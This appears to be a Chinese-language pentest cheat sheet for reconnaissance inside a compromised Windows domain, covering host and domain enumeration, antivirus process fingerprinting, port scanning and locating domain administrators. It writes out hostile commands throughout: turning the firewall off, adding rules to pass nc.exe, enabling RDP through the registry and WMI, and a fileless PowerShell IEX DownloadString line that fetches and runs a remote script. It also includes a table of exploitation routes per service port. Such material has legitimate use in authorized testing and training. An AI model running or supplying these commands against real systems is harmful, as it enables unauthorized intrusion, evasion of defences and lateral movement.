## ****1 收集本机信息****

###  ** **1.1 手动收集信息****

查询网络配置信息

ipconfig /all

查询操作系统和版本信息

systeminfo | findstr /B /C:"OS Name" /C:"OS Version"  
systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本"

查询系统体系结构

echo %PROCESSOR_ARCHITECTURE%

查看安装的软件及版本、路径等

wmic product get name,version

利用PowerShell命令，收集软件的版本信息

powershell "Get-WmiObject -class Win32_Product |Select-Object -Property
name,version"

查询本机服务信息

wmic service list brief

查询进程列表

tasklist  
wmic process list brief

常见杀毒软件进程

{"360tray.exe", "360安全卫士"},  
{"360sd.exe", "360杀毒"},  
{"a2guard.exe", "a-squared杀毒"},  
{"ad-watch.exe", "Lavasoft杀毒"},  
{"cleaner8.exe", "The Cleaner杀毒"},  
{"vba32lder.exe", "vb32杀毒"},  
{"MongoosaGUI.exe", "Mongoosa杀毒"},  
{"CorantiControlCenter3-2.exe", "Coranti2012杀毒"},  
{"F-PROT.EXE", "F-PROT杀毒"},  
{"CMCTrayIcon.exe", "CMC杀毒"},  
{"K7TSecurity.exe", "K7杀毒"},  
{"UnThreat.exe", "UnThreat杀毒"},  
{"CKSoftShiedAntivirus4.exe", "Shield Antivirus杀毒"},  
{"AVWatchService.exe", "VIRUSfighter杀毒"},  
{"ArcaTasksService.exe", "ArcaVir杀毒"},  
{"iptray.exe", "Immunet杀毒"},  
{"PSafeSysTray.exe", "PSafe杀毒"},  
{"nspupsvc.exe", "nProtect杀毒"},  
{"SpywareTerminatorShield.exe", "SpywareTerminator杀毒"},  
{"BKavService.exe", "Bkav杀毒"},  
{"MsMpEng.exe", "Microsoft Security Essentials"},  
{"SBAMSvc.exe", "VIPRE"},  
{"ccSvcHst.exe", "Norton杀毒"},  
{"QQ.exe", "QQ"},  
{"f-secure.exe", "冰岛"},  
{"avp.exe", "卡巴斯基"},  
{"KvMonXP.exe", "江民杀毒"},  
{"RavMonD.exe", "瑞星杀毒"},  
{"Mcshield.exe", "麦咖啡"},  
{"egui.exe", "NOD32"},  
{"kxetray.exe", "金山毒霸"},  
{"knsdtray.exe", "可牛杀毒"},  
{"avcenter.exe", "Avira(小红伞)"},  
{"ashDisp.exe", "Avast网络安全"},  
{"rtvscan.exe", "诺顿杀毒"},  
{"ksafe.exe", "金山卫士"},  
{"QQPCRTP.exe", "QQ电脑管家"},  
{"Miner.exe", "流量矿石"},  
{"AYAgent.aye", "韩国胶囊"},  
{"patray.exe", "安博士"},  
{"V3Svc.exe", "安博士V3"},  
{"avgwdsvc.exe", "AVG杀毒"},  
{"ccSetMgr.exe", "赛门铁克"},  
{"QUHLPSVC.EXE", "QUICK HEAL杀毒"},  
{"mssecess.exe", "微软杀毒"},  
{"SavProgress.exe", "Sophos杀毒"},  
{"fsavgui.exe", "F-Secure杀毒"},  
{"vsserv.exe", "比特梵德"},  
{"remupd.exe", "熊猫卫士"},  
{"FortiTray.exe", "飞塔"},  
{"safedog.exe", "安全狗"},  
{"parmor.exe", "木马克星"},  
{"beikesan.exe", "贝壳云安全"},  
{"KSWebShield.exe", "金山网盾"},  
{"TrojanHunter.exe", "木马猎手"},  
{"GG.exe", "巨盾网游安全盾"},  
{"adam.exe", "绿鹰安全精灵"},  
{"AST.exe", "超级巡警"},  
{"ananwidget.exe", "墨者安全专家"},  
{"AVK.exe", "GData"},  
{"ccapp.exe", "Symantec Norton"},  
{"avg.exe", "AVG Anti-Virus"},  
{"spidernt.exe", "Dr.web"},  
{"Mcshield.exe", "Mcafee"},  
{"avgaurd.exe", "Avira Antivir"},  
{"F-PROT.exe", "F-Prot AntiVirus"},  
{"vsmon.exe", "ZoneAlarm"},  
{"avp.exee", "Kaspersky"},  
{"cpf.exe", "Comodo"},  
{"outpost.exe", "Outpost Firewall"},  
{"rfwmain.exe", "瑞星防火墙"},  
{"kpfwtray.exe", "金山网镖"},  
{"FYFireWall.exe", "风云防火墙"},  
{"MPMon.exe", "微点主动防御"},  
{"pfw.exe", "天网防火墙"},  
{"S.exe", "在抓鸡"},  
{"1433.exe", "在扫1433"},  
{"DUB.exe", "在爆破"},  
{"ServUDaemon.exe", "发现S-U"},  
{"BaiduSdSvc.exe", "百度杀软"},

安全狗：  
SafeDogGuardCenter.exe  
safedogupdatecenter.exe  
safedogguardcenter.exe  
SafeDogSiteIIS.exe  
SafeDogTray.exe  
SafeDogServerUI.exe  
  
D盾：  
D_Safe_Manage.exe  
d_manage.exe  
  
云锁：  
yunsuo_agent_service.exe  
yunsuo_agent_daemon.exe  
  
护卫神：  
HwsPanel.exe 护卫神·入侵防护系统（状态托盘）  
hws_ui.exe 护卫神·入侵防护系统  
hws.exe 护卫神·入侵防护系统 服务处理程序  
hwsd.exe 护卫神·入侵防护系统 监控组件  
  
火绒：  
hipstray.exe  
wsctrl.exe  
usysdiag.exe  
  
趋势科技：  
TMBMSRV.exe  
ntrtscan.exe  
PCCNTMON.exe  
TMLISTEN.exe

查看启动程序信息

wmic startup get command,caption

查看计划任务

schtasks /query /fo LIST /v

查看主机开机时间

net statistics workstation

查询用户列表

本机用户列表：  
net user  
本地管理员（通常包含域用户）信息：  
net localgroup administrators  
查看当前在线用户  
query user || qwinsta

列出或断开本地计算机与所连接的客户端之间的会话

net session

查询端口列表

netstat -ano

查看补丁列表

systeminfo  
wmic qfe get Caption,Description,HotFixID,InstalledOn

查询本机共享列表

net share  
wmic share get name,path,status

查询路由表及所有可用接口的ARP缓存表

route print  
arp -a

查询防火墙相关配置

关闭防火墙：  
win2003以前的版本：netsh firewall set opmode disable  
win2003以后的版本：netsh advfirewall set allprofiles state off  
查看防火墙配置：  
netsh firewall show config  
修改防火墙配置：  
win2003以前的版本：netsh firewall add allowedprogram c:\nc.exe "allow nc" enable  
win2003以后的版本：netsh advfirewall firewall add rule name="pass nc" dir=in
action=allow program="c:\nc.exe"  
允许指定程序退出：netsh advfirewall firewall add rule name="Allow nc" dir=out
action=allow program="c:\nc.exe"  
允许3389端口放行：netsh advfirewall firewall add rule name="Remote Desktop"
protocol=TCP dir=in localport=3389 action=allow  
自定义防火墙日志的储存位置：  
netsh advfirewall set currentprofile logging filename "C:\window\temp\fw.log"

查看代理配置情况

reg query
"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet
Settings"

查询并开启远程连接服务

查看远程连接端口：  
Reg query "hkey_local_machine\system\currentcontrolset\control\terminal
server\winstations\RDP-Tcp" /v portnumber  
win2003中开启3389：  
wmic path win32_terminalservicesetting where (__CLASS !="") call
setallowtsconnections 1  
  
win2008和win2012中开启3389：  
wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting
where (__CLASS !="") call setallowtsconnections 1  
  
wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where
(TerminalName='RDP-Tcp') call setuserauthenticationrequired 1  
  
reg add "HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER" /v
fSingleSessionPerUser /t REG_DWORD /d 0 /f

###  ** **1.2 自动收集信息****

WMIC（Windows管理工具命令行）。在默认情况下，任何版本的Windows XP的低权限用户不能访问WMIC，Windows
7以上版本的低权限用户允许访问WMIC并执行相关查询操作。

下载地址：<http://www.fuzzysecurity.com/scripts/files/wmic_info.rar>

执行完脚本后，会将所有结果写入一个HTML文件中。

###  ** **1.3 Empire下的主机信息收集****

Empire提供了用于收集主机信息的模块。输入命令：

usemodule situational_awareness/host/winenum

empire下载地址：<https://github.com/EmpireProject/Empire.git>

##  ** **2 查询当前权限****

###  ** **2.1 查看当前权限****

whoami

共有以下三种情况：

> 本地普通用户：只能查询本机相关信息，不能查询域内信息。
>
> 本地管理员用户：可以查询域内信息。
>
> 域内用户：可以查询域内信息。

###  ** **2.2 获取域SID****

whoami /all

![1650767510_6264b6968e5e3435cd430.png!small?1650767511236](https://image.3001.net/images/20220424/1650767510_6264b6968e5e3435cd430.png!small?1650767511236)

当前域hacke的SID为S-1-5-21-1876960018-2564456387

域用户user1的SID为S-1-5-21-1876960018-2564456387-1273048475-1105

###  ** **2.3 查询指定用户的详细信息****

net user xxx /domain

##  ** **3 判断是否存在域****

###  ** **3.1 ipconfig命令****

ipconfig /all

在使用反向解析查询命令nslookup来解析IP地址。用解析得到的进行对比，判断域控制器和DNS服务器是否在同一台服务器上。

###  ** **3.2 查看系统详细信息****

systeminfo

###  ** **3.3 查询当前登录域及登录用户信息****

net config workstation

###  ** **3.4 判断主域****

net time /domain

存在以下三种情况：

> 存在域，但当前用户不是域用户。命令会执行失败。
>
> 存在域，且当前用户是域用户。
>
> 当前网络环境为工作组，不存在域。

##  ** **4 探测域内存活主机****

###  ** **4.1 利用NetBIOS快速探测内网****

NetBIOS，为网上基本输入输出系统（英语：Network Basic Input/Output
System）的缩写，它提供了OSI模型中的会话层服务，让在不同计算机上运行的不同程序，可以在局域网中，互相连线，以及分享数据。严格来说，NetBIOS不是一种网上协议，而是应用程序接口（API）。

可扫描本地或远程TCP / IP网络上的打开的NETBIOS名称服务器，但只能用于局域网。  
官网链接：<http://www.unixwiz.net/tools/nbtscan.html>

参数说明：

Token

|

含义  
  
---|---  
  
SHARING

|

机器正在运行的文件和打印共享服务，但这并不一定有内容共享  
  
DC

|

机器可能是Windows NT域控制器，无论是主域还是辅助域。  
  
U=user

|

机器可能有一个具有指定名称的登录用户  
  
IIS

|

机器可能安装了Microsoft的Internet信息服务器（IIS）  
  
EXCHANGE

|

机器可能安装Microsoft Exchange  
  
NOTES

|

单机器可能安装Lotus Notes电子邮件客户端  
  
?

|

没有识别出NETBIOS资源  
  
###  ** **4.2**** ** **利用ICMP协议快速探测内网****

ICMP（Internet Control Message
Protocol）Internet控制报文协议。它是TCP/IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。

使用ICMP协议：

命 令：

for /L %I in (1,1,254) DO @ping -w 1 -n 192.168.1.%I | findstr "TTL"

解释：

%i in (1,1,254) 遍历主机位从1 ~254的所有IP  
-n ping的次数  
-w 等待每次回复的时长（毫秒）  
192.168.0.%i 遍历IP 自192.168.0.1~192.168.0.254的所有IP  
| bat 管道，将前面的结果通过管道输入给后面的命令

###  ** **4.3**** ** **使用ARP扫描探测内网****

地址解析协议，即ARP（Address Resolution
Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。

命令：

arp -a  
arp.exe -t 192.168.1.0/20

##  ** **5 扫描域内端口****

通过端口扫描主要用于得到端口的banner信息、端口上运行的服务、发现常见应用的默认端口。

###  ** **5.1 利用telnet进行端口扫描****

telnet 192.168.0.2 22  
telnet 192.168.0.2 3306

###  ** **5.2 Metasploit端口扫描****

Metasploit渗透测试利器，提供了很多漏洞利用、扫描功能。

auxiliary/scanner/portscan/ack ACK防火墙扫描  
auxiliary/scanner/portscan/ftpbounce FTP跳端口扫描  
auxiliary/scanner/portscan/syn SYN端口扫描  
auxiliary/scanner/portscan/tcp TCP端口扫描  
auxiliary/scanner/portscan/xmas TCP"XMas"端口扫描

使用auxiliary/scanner/portscan/tcp模块示例

use auxiliary/scanner/portscan/tcp  
show options  
set ports 1-1024  
set RHOSTS 192.168.0.1  
set THREADS 10  
run

###  ** **5.3 PowerSploit的Invoke-portscan.ps1****

无文件形式扫描：

powershell.exe -nop -exec bypass -c "IEX (New-Object
Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1');Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports
'445,1433,80,8080,3389' -oA c:\ProgramData\ip_info"

###  ** **5.4 Nishang的Invoke-PortScan模块****

获取帮助

Get-Help Invoke-PortScan -full

详细代码：<https://github.com/samratashok/nishang/blob/master/Scan/Invoke-PortScan.ps1>

StartAddress 扫描范围开始地址  
EndAddress 扫描范围结束地址  
ScanPort 进行端口扫描  
Port
指定扫描端口，不指定port，则默认端口为21,22,23,53,69,71,80,98,110,139,111,389,443,445,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,
5801,5900,5555,5901  
TimeOut 设置超时时间  
-ResolveHost 解析主机名

扫描存活主机及端口并解析主机名

使用方式

Invoke-PortScan -StartAddress 192.168.0.1 -EndAddress 192.168.10.254
-ResolveHost -ScanPort

###  ** **5.5 Nmap****

####  ** **参数速查表****

参数(注意区分大小写)

|

说明  
  
---|---  
  
-sT

|

TCP connect()扫描，这种方式会在目标主机的日志中记录大批连接请求和错误信息。  
  
-sS

|

半开扫描，很少有系统能把它记入系统日志。不过，需要Root权限。  
  
-sF -sN

|

秘密FIN数据包扫描、Xmas Tree、Null扫描模式  
  
-sP

|

ping扫描，Nmap在扫描端口时，默认都会使用ping扫描，只有主机存活，Nmap才会继续扫描。  
  
-sU

|

UDP扫描，但UDP扫描是不可靠的  
  
-sA

|

这项高级的扫描方法通常用来穿过防火墙的规则集  
  
-sV

|

探测端口服务版本  
  
-Pn

|

扫描之前不需要用ping命令，有些防火墙禁止ping命令。可以使用此选项进行扫描  
  
-v

|

显示扫描过程，推荐使用  
  
-h

|

帮助选项，是最清楚的帮助文档  
  
-p

|

指定端口，如“1-65535、1433、135、22、80”等  
  
-O

|

启用远程操作系统检测，存在误报  
  
-A

|

全面系统检测、启用脚本检测、扫描等  
  
-oN/-oX/-oG

|

将报告写入文件，分别是正常、XML、grepable 三种格式  
  
-T4

|

针对TCP端口禁止动态扫描延迟超过10ms  
  
-iL

|

读取主机列表，例如，“-iL C:\ip.txt”  
  
##### 5.5.1 扫描单个目标

nmap ip

如：nmap 192.168.0.101

##### 5.5.2 扫描多个目标

nmap ip1 ip2 适用于目标地址不再同一个网段或在同一网段不连续且数量不多的情况。

如：nmap 192.168.0.101 192.168.0.110

##### 5.5.3 扫描一个范围内的目标

nmap xxx.xxx.xxx.xxx-xxx

如：nmap 192.168.0.100-110

##### 5.5.4 扫描目标地址所在某网段

namp xxx.xxx.xxx.xxx/xx

如：nmap 192.168.0.1/24

##### 5.5.5 扫描包含主机列表的文件中的所有地址

nmap -iL

如：nmap -iL /root/target.txt

##### 5.5.6 扫描除了一个目标地址之外的所有地址

nmap ip段 -exclude 被排除的ip

如：nmap 192.168.0.100-110 -exclude 192.168.0.103  
nmap 192.168.0.1/24 -exclude 192.168.0.103

##### 5.5.7 扫描除了某一个文件中的地址之外的所有地址

nmap ip段 -excludefile

如：nmap 192.168.0.100-110 -excludefile /root/targets.txt  
nmap 192.168.0.1/24 -excludefile /root/targets.txt

##### 5.5.8 扫描目标地址的指定端口

nmap ip -p 端口1，端口2，端口3……

如:nmap 192.168.0.101 -p 80,8080,3306,3389

##### 5.5.9 对目标地址进行路由跟踪

nmap --traceroute ip

如：nmap --traceroute 192.168.0.101

##### 5.5.10 扫描目标地址C段的在线主机

nmap -sP ip段

如：nmap -sP 192.168.0.1/24

##### 5.5.11 扫描目标地址操作系统版本进行探测

nmap -O ip

如：nmap -O 192.168.0.101

##### 5.5.12 扫描目标所开放的全部端口（半开式）

nmap -sS -p 端口号(多个用“,”隔开) -v ip

如：nmap -sS -p 1-65535 192.168.0.101

##### 5.5.13 扫描目标地址开放服务(端口)版本

nmap -sV ip

如：nmap -sV 192.168.0.101

##### 5.5.14 探测防火墙

nmap -sF -T4 ip

如：nmap -sF -T4 192.168.0.101

##### 5.5.15 绕过防火墙进行全面扫描

nmap -Pn -A ip

如：nmap -Pn -A 192.168.0.101

####  ** **进阶用法-advanced****

nmap --script=xx 使用某个脚本进行扫描， ** **这里只列出来部分脚本，更多脚本请看：****[ **
**https://nmap.org/nsedoc/****](https://nmap.org/nsedoc/) **
**（后续翻译后再更换链接）****

##### 1、弱口令扫描

nmap --script=auth ip 对某个主机或某网段主机的应用进行弱口令检测

如：nmap --script=auth 192.168.0.101

##### 2、暴力破解

nmap --script=brute ip 可以对数据库、MB、SNMP等进行简单的暴力破解

如：nmap --script=brute 192.168.0.101

##### 3、扫描常见漏洞

nmap --script=vuln ip

如：nmap --script=vuln 192.168.0.101

##### 4、使用脚本进行应用服务扫描

nmap --script=xxx ip 对常见应用服务进行扫描 如：VNC、MySQL、Telnet、Rync等服务

如VNC服务：nmap --script=realvnc-auth-bypass 192.168.0.101

##### 5、探测局域网内服务开放情况

nmap -n -p 端口号 --script=broadcast ip

如：nmap -n -p 80,3306 --script=broadcast 192.168.0.101

##### 6、Whois解析

nmap -script external url

如：nmap -script external baidu.com

##### 7、扫描Web敏感目录

nmap -p 80 --script=http-enum.nse ip

nmap -p 80 --script=http-enum.nse 192.168.0.101

##### 8、其他

上述所有命令的各种灵活组合使用。

###  ** **5.6 端口Banner信息****

####  ** **1、文件共享服务端口****

 ** **端口号****

|

 ** **端口说明****

|

 ** **利用方向****  
  
---|---|---  
  
21/22/69

|

FTP/TFTP文件传输协议

|

允许匿名上传、下载、爆破和嗅探  
  
2049

|

NFS服务

|

配置不当  
  
139

|

Samba服务

|

爆破、未授权访问、远程代码执行  
  
389

|

LDAP目录访问协议

|

注入、允许匿名访问、弱口令  
  
####  ** **2、远程连接服务端口****

 ** **端口号****

|

 ** **端口说明****

|

 ** **利用方向****  
  
---|---|---  
  
22

|

SSH远程连接

|

爆破、SSH隧道及内网代理转发、文件传输  
  
23

|

Telnet

|

爆破、嗅探、弱口令  
  
3389

|

RDP远程桌面连接

|

Shift后门(Windows Server 2003以下版本)、爆破  
  
5900

|

VNC

|

弱口令爆破  
  
5632

|

PyAnywhere服务

|

抓密码、代码执行  
  
####  ** **3、Web应用服务端口****

 ** **端口号****

|

 ** **端口说明****

|

 ** **利用方向****  
  
---|---|---  
  
80/443/8080

|

常见的Web服务端口

|

Web攻击、爆破、对应服务器版本漏洞  
  
7001/70022

|

WebLogic控制台

|

Java反序列化、弱口令  
  
8080/8089

|

Jboos/Resin/Jetty/Jenkins

|

反序列化、控制台弱口令  
  
9090

|

WebSphere控制台

|

Java反序列化、弱口令  
  
4848

|

GlassFish控制台

|

弱口令  
  
1352

|

Lotus dominio邮件服务

|

弱口令、信息泄露、爆破  
  
10000

|

Webmin-Web控制面板

|

弱口令  
  
####  ** **4、数据库服务端口****

 ** **端口号****

|

 ** **端口说明****

|

 ** **利用方向****  
  
---|---|---  
  
3306

|

MySQL

|

注入、提权、爆破  
  
1433

|

MSSQL

|

注入、提权、SAP弱口令、爆破  
  
1521

|

Oracle

|

TNS爆破、注入、反弹Shell  
  
5432

|

PostgreSQL

|

爆破、注入、弱口令  
  
27017/27018

|

MongoDB

|

爆破、未授权访问  
  
6379

|

Redis

|

可尝试未授权访问、弱口令爆破  
  
5000

|

SysBase/DB2

|

爆破、注入  
  
####  ** **5、邮件服务端口****

 ** **端口号****

|

 ** **端口说明****

|

 ** **利用方向****  
  
---|---|---  
  
25

|

SMTP邮件服务

|

邮件伪造  
  
110

|

POP3

|

爆破、嗅探  
  
143

|

IMAP

|

爆破  
  
####  ** **6、网络常见协议端口****

 ** **端口号****

|

 ** **端口说明****

|

 ** **利用方向****  
  
---|---|---  
  
53

|

DNS域名系统

|

允许区域传送、DNS劫持、缓存投毒、欺骗  
  
67/68

|

DHCP服务

|

劫持、欺骗  
  
161

|

SNMP协议

|

爆破、搜集目标内网信息  
  
####  ** **7、特殊服务端口****

 ** **端口号****

|

 ** **端口说明****

|

 ** **利用方向****  
  
---|---|---  
  
2181

|

Zookeeper服务

|

未授权访问  
  
8069

|

Zabbix服务

|

远程执行、SQL注入  
  
9200/9300

|

Elasticsearch服务

|

远程执行  
  
11211

|

Memcache服务

|

未授权访问  
  
512/513/514

|

Linux Rexec服务

|

爆破、Rlogin登录  
  
873

|

Rsync服务

|

匿名访问、文件上传  
  
3690

|

Svn服务

|

Svn泄露、未授权访问  
  
50000

|

SAP Management Console

|

远程执行  
  
##  ** **6 收集域内基础信息****

###  ** **6.1 查询域名****

net view /domain

###  ** **6.2 查询域内所有计算机****

net view /domain:hack

###  ** **6.3 查询域内所有用户列表****

net group /domain

系统常见用户身份如下：

domain admins:域管理员  
domain computers :域内机器  
domain controllers:域控制器  
domain guest：域访客，权限较低  
domain users：域用户  
domain admins：企业系统管理员用户

###  ** **6.4 查询域内所有计算机列表****

net group "domain computers" /domain

###  ** **6.5 获取域密码信息****

net accouts /domain

###  ** **6.6 获取域信任信息****

nltest /domain_trusts

###  ** **6.7 获取DC机器名****

nltest /DCLIST:hack

###  ** **6.8 查看域控制器组****

net view "domain controllers" /domain

###  ** **6.9 查询域用户****

net user /domain

###  ** **6.10 查询本地管理员组用户****

net localgroup adminstrators

##  ** **7 查找域控制器****

###  ** **7.1 查看域控制器的机器名****

nltest /DCLIST:域名

更多命令

netdom query PDC  
  
netdom query查询信息命令的常用语法是:  
/Domain 指定要查询信息的域  
/UserD 用于与 /Domain 参数指定的域建立连接的用户帐户  
/PasswordD /UserD 指定的用户帐户的密码。* 表示提示输入密码  
/Server 用于执行查询的特定域控制器的名称。  
/Verify
对于计算机，验证计算机和域控制器之间的安全通道是否正常运行。对于信任，验证域之间的信任是否正常运行。仅验证出站信任。用户必须使用域管理员凭据来获取正确的验证结果。  
/Direct 仅应用于信任查询，仅列出直接信任链接并忽略通过可传递链接间接信任的域。请勿与 /Verify 一起使用。  
  
WORKSTATION 在域中查询工作站列表  
SERVER 在域中查询服务器列表  
DC 在域中查询域控制器列表  
OU 在域中查询特定用户可在其中创建计算机对象的组织单位的列表  
PDC 在域中查询当前的主域控制器  
FSMO 在域中查询当前 FSMO 所有者的列表  
TRUST 在域中查询其信任的列表

###  ** **7.2 查看域控主机名****

nslookup -type=SRV _ldap._tcp

###  ** **7.3 查看域控时间****

通常域时间服务器为主域控制器

net time /domain

###  ** **7.4 查看与控制器组成员****

net group "Domain Controllers" /domain

实际网络中，一个域内通常有两台或两台以上的域控制器存在，目的是一旦主域控制器发生故障，备用的域控制器可以保证域内的服务和验证工作正常进行。

##  ** **8 获取域内的用户和管理员信息****

###  ** **8.1 查询所有域用户列表****

net user /domain #向域控制器进行查询  
wmic useraccount get /all #获取域内用户的详细信息  
dsquery user #查看存在的用户  
net localgroup administrators #查询本地管理员组

###  ** **8.2 查询域管理员用户组****

net group "domain admins" /domain #查询域管理员用户  
net group "Enterprise Admins" /domain #查询管理员用户组

##  ** **9 定位域管理员****

###  ** **9.1 psloggedon.exe****

下载链接 <https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon>

此工具用于查看本地登录的用户和通过本地计算机或远程计算机资源登录的用户

psloggedon.exe [-] [-l] [-x] [\\\computername或username]

常用参数有：  
  
-：显示支持的选项和用于输出的单位  
-1：仅显示本地登录不显示本地和网络资源登录  
-x：不显示登录时间  
\computer：指定要列出登录信息的计算机名称  
username：指定用户名，在网络中搜索该用户登录的计算机

\\\后面接的是域控机器名，看一下登录过域控的用户名

如果\\\接的是用户名，那就会搜索网上邻居的计算机，并显示当前用户是否已经登录

###  ** **9.2 PVEFindADUser.exe****

下载链接 <https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn>

功能也是查找域用户位置、某计算机上登录用户。运行需要计算机支持framework2.0且以管理员权限运行

直接pvefinaduser.exe -current，一把梭，即可查看域中所有计算机的登录用户

###  ** **9.3 netview.exe****

工具下载地址：<https://github.com/mubix/netview>

netview.exe 是一个枚举工具，使用WinAPI枚举系统、利用NetSessionEnum 找寻登录会话利用NetShareEnum
找寻共享，利用NerWkstaUserEnum 枚举登录的用户。同时，netview.exe 能够查询共享入口和有价值的用户。绝大部分功能不需要管理员权限。

常用参数：

-f filename.txt：指定要提取主机名列表的文件  
-e filename.txt：指定要排除的主机名的文件  
-o filename.txt：将所有输出重定向到指定文件  
-d domain：指定要提取主机列表的域。如果没有指定，则从当前域中提取  
-g group：指定搜索的组名。如果没有指定，则在Domain Admins组中搜索  
-c：对已找到的共享目录/文件的访问权限进行检查

###  ** **9.4 Namp的NSE脚本****

工具下载地址：<https://nmap.org/nsedoc/scripts/smb-enum-sessions.html>

如果存在域账户或者本地账户就可以使用Nmap的smb-enum-sessions.nes引擎获取远程机器的登录会话。

常用参数：

smb-enum-domain：对域控制器进行信息收集，可以获取主机的信息、用户、可使用密码策略的用户等  
smb-enum-users：在进行域渗透测试时，如果获得了域内某台主机的权限，无法获取更多的域用户信息，就可以借助这个脚本对域控制器进行扫描  
smb-enum-shares：遍历远程主机的共享目录  
smb-enum-processes：对主机的系统进行遍历。通过这些信息，可以知道目标主机上正在运行哪些软件。  
smb-enum-sessions：获取域内主机的用户登录会话，查看当前是否有用户登录。  
smb-os-discovery：收集目标主机的操作系统、计算机名、域名域林名称、NetBIOS机器名、NetBIOS域名，工作组、系统时间等信息

###  ** **9.5 PowerView.PS1脚本****

工具下载地址：<https://github.com/PowerShellEmpirc/PowerTools/tree/master/PowerView>

powerview脚本可以用来获取当前域管理员在线登录的服务器

Invoke-UserHunter：搜索本地域中域管理员当前在线的主机，并验证当前用户是否具有对这些主机的本地管理员访问权限。它可以使用 Get-NetSessions 和Get-NetLoggedon 扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，并且无需管理员权限。

打开powershell，进入脚本目录，输入Import-Module .\PowerView.ps1 导入脚本

然后输入Invoke-UserHunter即可

详细使用方法如下：

Import-Module为powershell导入脚本命令，这里假设我们下载的powerview.ps1脚本在C:\PowerView.ps1  
命令格式：powershell.exe -exec bypass -Command "& {Import-Module C:\PowerView.ps1;
powerview的命令参数}"

定位域管理员  
powershell.exe -exec bypass -Command "& {Import-Module C:\PowerView.ps1;
Invoke-UserHunter}"

更多PowerView命令参数

Get-NetDomain: 获取当前用户所在域的名称  
Get-NetUser: 获取所有用户的详细信息  
Get-NetDomainController: 获取所有域控制器的信息  
Get-NetComputer: 获取域内所有机器的详细信息  
Get-NetOU: 获取域中的OU信息  
Get-NetGroup: 获取所有域内组和组成员信息  
Get-NetFileServer: 根据SPN获取当前域使用的文件服务器信息  
Get-NetShare: 获取当前域内所有网络共享信息  
Get-NetSession: 获取指定服务器的会话  
Get-NetRDPSession: 获取指定服务器的远程连接  
Get-NetProcess: 获取远程主机的进程  
Get-UserEvent: 获取指定用户的日志  
Get-ADObiect: 获取活动目录的对象  
Get-NetGPO: 获取域内所有的组策略对象  
Get-DomainPolicy: 获取域默认策略或域控制器策略  
Invoke-UserHunter: 获取域用户登录的计算机信息及该用户是否有本地管理员权限  
Invoke-ProcessHunter: 通过查询域内所有的机器进程找到特定用户  
Invoke-UserEvenHunter: 根据用户日志查询某域用户登录过哪些域机器。

###  ** **9.6 SPN扫描****

不同于常规的tcp/udp端口扫描，由于spn本质就是正常的Kerberos请求，所以扫描是非常隐蔽，日前针对此类扫描的检测暂时也比较少。

大部分win系统默认已自带spn探测工具即：setspn.exe

此操作无需管理权限

域内机器执行

setspn -T 域名 -Q */*

即可完整查出当前域内所有spn。

##  ** **10 查找域管理进程****

###  ** **10.1 本机检查****

  * 获取域管理员列表

net group "Domain Admins" /domain

  * 列出本机的所有进程及进程用户

tasklist /v

###  ** **10.2 查询域控制器的域用户会话****

  * 查询域控制器列表

net group "Domain Controllers" /domain

  * 收集域管理员列表

net group "Domain Admins" /domain

  * 收集所有活动域的会话列表

使用netsess.exe查询每个域控制器，收集所有活动域会话列表。netsess.exe是一个很棒的工具，它包含本地windows函数netsessionenum。

NetSess -h

  * 交叉引用域管理员列表与活动会话列表

对域管理员列表和活动会话列表进行交叉引用，可以确定那些IP地址有活动域令牌。

net localgroup "Domain Controllers" /domain > dcs.txt  
net localgroup "Domian Admins" /domain > admins.txt

然后运行一下脚本，会在当前目录下生成一个文本文件sessions.txt

FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i && @netsess -h %i 2>null
>sessions.txt && FOR /F %a in (admins.txt) DO @type sessions.txt | @findstr /I
%a

###  ** **10.3 查询远程系统中运行的任务****

如果目标机器在域系统中是通过共享的本地管理员账户运行的，就可以使用下列脚本来查询系统中的域管理任务。  
首先，从Domain Admins组中收集域管理员列表。

net group "Domain Admins" /domain > admins.txt  
net group "Domain Controllers" /domain > dcs.txt

然后，运行如下脚本，将目标域系统列表添加到ips.txt文件中，将收集的域管理员列表添加到names.txt文件中。

FOR /F %i in (dcs.txt) DO @echo [+] %i && @tasklist /V /S %i /U user /P
password 2>NUL > output.txt && FOR /F %n in (admins.txt) DO @type output.txt |
findstr %n > NUL && echo [!] %n was found running a process on %i && pause

###  ** **10.4 扫描远程系统的NetBIOS信息****

某些版本的Windows操作系统允许用户通过NetBIOS查询已登录用户。

net group "Domain Admins" /domain > admins.txt  
net group "Domain Controllers" /domain > dcs.txt

for /F %i in (dcs.txt) do @echo [+] Checking %i && nbtstat -A %i 2>NUL
>nbsessions.txt && FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr
/I %n > NUL && echo [!] %n was found logged into %i

使用nbtscan工具，就文件与nbtscan工具置于同一目录下

for /F %i in (dcs.txt) do @echo [+] Checking %i && nbtscan -f %i 2>NUL
>nbsessions.txt && FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr
/I %n > NUL && echo [!] %n was found logged into %i

##  ** **11 利用powershell收集域信息****

###  ** **11.1 权限类型****

powershell的执行权限共有四种：

Restricted：默认的设置，不允许任何脚本的运行  
AllSigned：只能运行经过数字证书签名的脚本  
RemoteSigned：运行本地的脚本不需要数字签名，但运行从网络下下载的脚本就必须要有数字签名  
Unrestricted：允许所有的脚本运行。

权限修改方式

Set-ExecutionPolicy -ExecutionPolicy Unrestricted

###  ** **11.2 PowerView****

PowerView是一款依赖PowerShell和WMI对内网进行查询的常用渗透测试脚本，它集成在PowerSploit工具包中。

